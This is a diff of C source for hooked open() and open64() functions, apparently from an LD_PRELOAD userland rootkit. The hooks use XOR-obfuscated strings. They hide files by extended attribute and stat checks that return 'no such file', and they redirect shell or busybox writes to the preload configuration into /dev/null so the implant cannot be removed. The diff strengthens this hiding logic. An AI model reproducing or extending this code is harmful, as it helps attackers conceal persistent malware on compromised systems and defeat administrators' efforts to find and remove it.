@@ -11,9 +11,8 @@ int open(const char *pathname, int flags, mode_t mode)
     char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
     if(hidden_xattr(pathname) && strstr(pathname, ld_preload_etc))
     {
-        CLEAN(ld_preload_etc);
         char *p = procname_self();
-        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) return old_open("/dev/null", flags, mode);
+        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) { CLEAN(ld_preload_etc); return old_open("/dev/null", flags, mode); }
     }
     CLEAN(ld_preload_etc);
 
@@ -50,7 +49,7 @@ int open(const char *pathname, int flags, mode_t mode)
         }
     }
 
-    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(pathname) || hidden_xstat(_STAT_VER, pathname, 32)) { errno = ENOENT; return -1; }
 
     return old_open(pathname, flags, mode);
 }
@@ -68,9 +67,8 @@ int open64(const char *pathname, int flags, mode_t mode)
     char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
     if(hidden_xattr(pathname) && strstr(pathname, ld_preload_etc))
     {
-        CLEAN(ld_preload_etc);
         char *p = procname_self();
-        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) return old_open64("/dev/null", flags, mode);
+        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) { CLEAN(ld_preload_etc); return old_open64("/dev/null", flags, mode); }
     }
     CLEAN(ld_preload_etc);
 
@@ -107,7 +105,7 @@ int open64(const char *pathname, int flags, mode_t mode)
         }
     }
 
-    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(pathname) || hidden_xstat(_STAT_VER, pathname, 64)) { errno = ENOENT; return -1; }
 
     return old_open64(pathname, flags, mode);
 }
